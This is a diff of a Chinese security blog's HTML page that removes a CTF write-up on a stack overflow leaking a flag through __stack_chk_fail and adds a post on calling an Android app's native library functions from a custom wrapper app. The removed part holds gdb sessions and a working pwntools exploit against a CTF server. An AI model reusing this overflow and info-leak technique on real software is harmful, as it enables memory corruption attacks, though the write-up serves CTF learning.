@@ -94,7 +94,7 @@
 
 
 
-  <meta name="keywords" content="pwn,stack," />
+  <meta name="keywords" content="Android,Tools,eclipse," />
 
 
 
@@ -107,16 +107,20 @@
 
 
 
-<meta name="description" content="程序的主函数很明显_IO_gets存在栈溢出。">
+<meta name="description" content="在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出之利用__stack_chk_fail">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2017/03/04/栈溢出之利用-stack-chk-fail/index.html">
+<meta property="og:title" content="Android强调native函数的两种方法">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2020/04/29/Android强调native函数的两种方法/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="程序的主函数很明显_IO_gets存在栈溢出。">
-<meta property="og:updated_time" content="2020-04-27T08:59:29.033Z">
+<meta property="og:description" content="在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。">
+<meta property="og:image" content="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg">
+<meta property="og:image" content="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg">
+<meta property="og:image" content="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg">
+<meta property="og:updated_time" content="2020-04-29T03:43:54.448Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="栈溢出之利用__stack_chk_fail">
-<meta name="twitter:description" content="程序的主函数很明显_IO_gets存在栈溢出。">
+<meta name="twitter:title" content="Android强调native函数的两种方法">
+<meta name="twitter:description" content="在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。">
+<meta name="twitter:image" content="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg">
 
 
 
@@ -146,13 +150,13 @@
 
 
 
-  <link rel="canonical" href="http://yunnigu.dropsec.xyz/2017/03/04/栈溢出之利用-stack-chk-fail/"/>
+  <link rel="canonical" href="http://yunnigu.dropsec.xyz/2020/04/29/Android强调native函数的两种方法/"/>
 
 
 
 
 
-  <title>栈溢出之利用__stack_chk_fail | YungGong</title>
+  <title>Android强调native函数的两种方法 | YungGong</title>
   
 
 
@@ -313,7 +317,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2017/03/04/栈溢出之利用-stack-chk-fail/">
+    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2020/04/29/Android强调native函数的两种方法/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yun">
@@ -330,7 +334,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">栈溢出之利用__stack_chk_fail</h1>
+          <h1 class="post-title" itemprop="name headline">Android强调native函数的两种方法</h1>
         
 
         <div class="post-meta">
@@ -342,8 +346,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-04T10:44:24+08:00">
-                2017-03-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-29T09:34:59+08:00">
+                2020-04-29
               </time>
             
 
@@ -358,8 +362,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-04-27T16:59:29+08:00">
-                2020-04-27
+              <time title="更新于" itemprop="dateModified" datetime="2020-04-29T11:43:54+08:00">
+                2020-04-29
               </time>
             
           </span>
@@ -397,152 +401,95 @@
       
 
       
-        <p>程序的主函数很明显_IO_gets存在栈溢出。<br><a id="more"></a><br>查看开启的保护机制，开了一大堆。。。</p>
-<pre><code>gdb-peda$ checksec 
-CANARY    : ENABLED
-FORTIFY   : ENABLED
-NX        : ENABLED
-PIE       : disabled
-RELRO     : disabled
-</code></pre><p>这题是国外的一个CTF题目，他利用的是fortify的报错泄露信息，在栈溢出的时候，数组越界写入，导致 canary值被修改。在函数退出时检查canary，发现canary被修改，函数不能安全返回，call到__stack_chk_fail打印argv[0]这个指针指向的字符串，默认是程序的名字。所以如果我们把它覆盖为flag的地址时，它就会把flag给打印出来。</p>
-<pre><code>void
-__attribute__ ((noreturn))
-__stack_chk_fail (void)
-  {
-     __fortify_fail (&quot;stack smashing detected&quot;);
-  }
-void
-__attribute__ ((noreturn)) internal_function
-__fortify_fail (const char *msg)
-  {
-    /* The loop is added only to keep gcc happy.  */
-    while (1)
-      __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
-              msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
-  }
-</code></pre><p>我们可以自己尝试将程序溢出</p>
-<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;A&quot;*0x200+&quot;\n&quot;+&quot;a&quot;&apos;| ./smashes
-Hello!
-What&apos;s your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
-Please overwrite the flag: Thank you, bye!
-*** stack smashing detected ***: ./smashes terminated
-Aborted (core dumped)
-</code></pre><p>下一步就是计算argv[0]到缓冲区的距离</p>
-<pre><code>gdb-peda$ b *0x0040080e
-Breakpoint 1 at 0x40080e
-gdb-peda$ r
-Starting program: /home/longlong/Desktop/smashes 
-Hello!
-What&apos;s your name? [----------------------------------registers-----------------------------------]
-RAX: 0x19 
-RBX: 0x0 
-RCX: 0x7ffff7b00710 (&lt;__write_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
-RDX: 0x19 
-RSI: 0x7ffff7dd59e0 --&gt; 0x0 
-RDI: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
-RBP: 0x0 
-RSP: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
-RIP: 0x40080e (call   0x4006c0 &lt;_IO_gets@plt&gt;)
-R8 : 0x7ffff7fdb740 (0x00007ffff7fdb740)
-R9 : 0x400934 (&quot;Hello!\nWhat&apos;s your name? &quot;)
-R10: 0x7ffff7fdb740 (0x00007ffff7fdb740)
-R11: 0x246 
-R12: 0x4006ee (xor    ebp,ebp)
-R13: 0x7fffffffdec0 --&gt; 0x1 
-R14: 0x0 
-R15: 0x0
-EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x400804:    xor    eax,eax
-   0x400806:    call   0x4006b0 &lt;__printf_chk@plt&gt;
-   0x40080b:    mov    rdi,rsp
-=&gt; 0x40080e:    call   0x4006c0 &lt;_IO_gets@plt&gt;
-   0x400813:    test   rax,rax
-   0x400816:    je     0x40089f
-   0x40081c:    mov    rdx,rsp
-   0x40081f:    mov    esi,0x400960
-Guessed arguments:
-arg[0]: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
-0008| 0x7fffffffdcb8 --&gt; 0x7ffff7ff74c0 --&gt; 0x7ffff7a15000 --&gt; 0x10102464c457f 
-0016| 0x7fffffffdcc0 --&gt; 0x7fffffffde10 --&gt; 0x0 
-0024| 0x7fffffffdcc8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 (&quot;GLIBC_2.2.5&quot;)
-0032| 0x7fffffffdcd0 --&gt; 0x1 
-0040| 0x7fffffffdcd8 --&gt; 0x7ffff7ffe520 --&gt; 0x7ffff7ffe480 --&gt; 0x7ffff7ff79c8 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
-0048| 0x7fffffffdce0 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
-0056| 0x7fffffffdce8 --&gt; 0x7ffff7de4961 (&lt;_dl_lookup_symbol_x+305&gt;:    cmp    eax,0x0)
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-
-Breakpoint 1, 0x000000000040080e in ?? ()
-gdb-peda$ find /home
-Searching for &apos;/home&apos; in: None ranges
-Found 8 results, display max 8 items:
-[stack] : 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
-[stack] : 0x7fffffffeafc (&quot;/home/longlong/.virtualenvs&quot;)
-[stack] : 0x7fffffffeb69 (&quot;/home/longlong/Devel&quot;)
-[stack] : 0x7fffffffec50 (&quot;/home/longlong/.virtualenvs&quot;)
-[stack] : 0x7fffffffec70 (&quot;/home/longlong/Desktop&quot;)
-[stack] : 0x7fffffffed82 (&quot;/home/longlong&quot;)
-[stack] : 0x7fffffffefa5 (&quot;/home/longlong/.Xauthority&quot;)
-[stack] : 0x7fffffffefd9 (&quot;/home/longlong/Desktop/smashes&quot;)
-gdb-peda$ find 0x7fffffffe253
-Searching for &apos;0x7fffffffe253&apos; in: None ranges
-Found 2 results, display max 2 items:
-   libc : 0x7ffff7dd4018 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
-[stack] : 0x7fffffffdec8 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;) 
-gdb-peda$ distance $rsp 0x7fffffffdec8
-From 0x7fffffffdcb0 to 0x7fffffffdec8: 536 bytes, 134 dwords
-</code></pre><p>通过gdb计算可以知道argv[0]到缓冲区的距离是0x218字节。</p>
-<p>查找发现flag同样存储在制度存储器0x400d20这个位置</p>
-<pre><code>gdb-peda$ find PCTF
-Searching for &apos;PCTF&apos; in: None ranges
-Found 2 results, display max 2 items:
-smashes : 0x400d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
-smashes : 0x600d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
-</code></pre><p>本地覆盖结果如下：</p>
-<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;a&quot;*0x218+&quot;\x20\x0d\x40\x00\x00\x00\x00\x00&quot;+&quot;\n&quot;+&quot;a&quot;&apos; | ./smashes
-Hello!
-What&apos;s your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
-Please overwrite the flag: Thank you, bye!
-*** stack smashing detected ***: PCTF{Here&apos;s the flag on server} terminated
-Aborted (core dumped)
-</code></pre><p>提示flag在服务器上，然而远程连接过去是不会成功的。</p>
-<p>注意不要用原来flag的地址覆盖，因为原来存储flag的地方会被overwrite。但是由于ELF的映射方式，此flag会被映射两次，另外一个地方flag的内容不会变。</p>
-<p>原因是<strong>stack_chk_fail会调用</strong>libc_message</p>
-<pre><code>void
-__libc_message (int do_abort, const char *fmt, ...)
+        <p>在逆向分析APP的过程中，经常会遇到native函数调用，有些是可以通过正常的IDA动态调试分析其函数逻辑算法等，但有些函数由于多线程造成调试不便，甚至由于ollvm等混淆造成逆向困难就需要自行调用native函数实现想要的结果。<br><a id="more"></a></p>
+<p>#通过导出函数调用native函数<br>一般普通的native函数都是有导出函数的，因此只要找到导出函数名即可调用该native函数。</p>
+<p>##寻找导出函数<br>首先在java层找到native函数的调用<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
+<p>接下来在so中导出函数中该native函数</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
+<p>##编写Android APP<br>自己写一个带按钮的APP，调用该函数</p>
+<pre><code>public class MainActivity extends Activity 
 {
-  va_list ap; 
-  int fd = -1; 
-  va_start (ap, fmt);
-  /* Open a descriptor for /dev/tty unless the user explicitly
-     requests errors on standard error.  */
-  const char *on_2 = __libc_secure_getenv (&quot;LIBC_FATAL_STDERR_&quot;);
-  if (on_2 == NULL || *on_2 == &apos;\0&apos;)
-    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
-  if (fd == -1) 
-    fd = STDERR_FILENO;
-  /*......*/
+    public Button button;
+    @Override
+    protected void onCreate(Bundle savedInstanceState) 
+    {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        System.loadLibrary(&quot;Aes&quot;);
+
+        try 
+        {
+            button = (Button)findViewById(R.id.btn_test);
+            button.setOnClickListener(new OnClickListener() 
+            {
+
+                public void onClick(View v)
+                {
+                    try 
+                    {
+                        String encrypt = Aes.aesEncode(&quot;12345&quot;,
+                                &quot;350710466385995&quot;);
+
+                        if (null != encrypt) 
+                        {
+
+                            Log.d(&quot;bbk&quot;,&quot;encrypt:&quot; + encrypt);
+                        }
+                        else 
+                        {
+                            Log.d(&quot;bbk&quot;, &quot;encrypt is NULL&quot;);
+                        }    
+
+                    } 
+                    catch (Exception e) 
+                    {
+                        for (int i = 0; i &lt; e.getStackTrace().length; i++)
+                        {
+                            Log.i(&quot;bbk&quot;,e.getStackTrace()[i].toString());
+                        }
+                    } 
+
+                }
+            });
+
+        } 
+        catch (Exception e) 
+        {
+            for (int i = 0; i &lt; e.getStackTrace().length; i++)
+            {
+                Log.i(&quot;bbk&quot;,e.getStackTrace()[i].toString());
+            }
+        }  
+
+    }
 }
-</code></pre><p>如果LIBC_FATAL<em>STDERR</em>环境变量没有设置或者为空，stderr会redirect到_PATH_TTY，通常是/dev/tty，因此错误信息将不会输出到stderr而是服务端可见的设备。<br>所以我们必须设置这个环境变量，正好可以用这个环境变量去覆盖flag的内容。</p>
-<p>最终exp:</p>
-<pre><code>from pwn import *
-old_flag_addr = 0x600d20
-new_flag_addr = 0x400d20
-#p = process(&apos;./smashes&apos;)
-p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
-p.recvuntil(&quot;name?&quot;)
-payload = &quot;a&quot;*0x218 + p64(new_flag_addr) 
-payload += p64(0) + p64(old_flag_addr)
-p.sendline(payload)
-p.recvuntil(&quot;flag: &quot;)
-env = &quot;LIBC_FATAL_STDERR_=1&quot;
-p.sendline(env)
-flag = p.recv()
-print flag
-</code></pre><p>根据glibc的源码可知，只要程序开了canary栈保护，就可以覆盖argv[0]来泄露想要的信息(&amp;set LIBC_FATAL<em>STDERR</em>=1)。</p>
+</code></pre><p>模拟原APP调用类调用native函数</p>
+<pre><code>public class Aes 
+{
+    private static native String aesEncode(String str, String str2);
+}
+</code></pre><p>##jni配置<br>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
+<p>###Android.mk<br>    LOCAL_PATH := $(call my-dir)</p>
+<pre><code>include $(CLEAR_VARS)
+LOCAL_MODULE := Aes
+LOCAL_SRC_FILES := libAes.so
+include $(PREBUILT_SHARED_LIBRARY)
+
+include $(CLEAR_VARS)
+LOCAL_MODULE := stlport_shared
+LOCAL_SRC_FILES := libstlport_shared.so
+include $(PREBUILT_SHARED_LIBRARY)
+
+include $(CLEAR_VARS)
+LOCAL_MODULE    := my_objectname
+LOCAL_SRC_FILES := my_objectname.cpp
+include $(BUILD_SHARED_LIBRARY)
+</code></pre><p>###Application.mk<br>    APP_ABI := armeabi-v7a</p>
+<p>###my_objectname.app<br>里面写#include<jni.h>即可</jni.h></p>
+<p>最后将APP安装到手机上运行即可输出调用结果</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
+<p>#通过函数地址调用native函数</p>
 
       
     </div>
@@ -589,9 +536,11 @@ print flag
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
+            <a href="/tags/Android/" rel="tag"># Android</a>
           
-            <a href="/tags/stack/" rel="tag"># stack</a>
+            <a href="/tags/Tools/" rel="tag"># Tools</a>
+          
+            <a href="/tags/eclipse/" rel="tag"># eclipse</a>
           
         </div>
       
@@ -604,8 +553,8 @@ print flag
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/28/XMAN-level4/" rel="next" title="XMAN-level4">
-                <i class="fa fa-chevron-left"></i> XMAN-level4
+              <a href="/2020/04/29/重出江湖/" rel="next" title="重出江湖">
+                <i class="fa fa-chevron-left"></i> 重出江湖
               </a>
             
           </div>
@@ -613,10 +562,6 @@ print flag
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/04/29/重出江湖/" rel="prev" title="重出江湖">
-                重出江湖 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
